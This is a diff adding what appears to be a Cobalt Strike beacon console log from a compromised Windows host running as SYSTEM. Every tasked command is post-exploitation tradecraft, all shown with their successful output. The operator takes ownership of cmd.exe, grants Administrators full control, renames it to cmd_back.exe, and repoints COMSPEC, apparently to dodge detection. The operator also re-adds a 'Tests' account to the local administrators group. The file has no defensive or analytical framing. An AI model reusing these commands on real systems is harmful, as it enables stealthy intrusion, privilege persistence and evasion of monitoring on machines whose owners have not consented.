@@ -1,0 +1,39 @@
+02/23 15:44:55 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 18052; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/23 17:55:35 [task] /c4***修改cmd名称并进行操作****
+02/23 17:55:35 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
+02/23 17:55:35 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
+02/23 17:55:35 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
+02/23 17:55:35 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
+02/23 17:55:35 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
+02/23 17:55:35 [task] Tasked beacon to run: Net Localgroup administrators Tests /add
+02/23 17:56:18 [checkin] host called home, sent: 693 bytes
+02/23 17:56:26 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。
+
+
+02/23 17:56:26 [output]
+received output:
+已处理的文件: C:\Windows\System32\cmd.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/23 17:56:26 [output]
+received output:
+
+成功: 指定的值已得到保存。
+
+
+02/23 17:56:26 [output]
+received output:
+命令成功完成。
+
+
+
+02/23 17:56:26 [output]
+received output:
+命令成功完成。
+
+
+
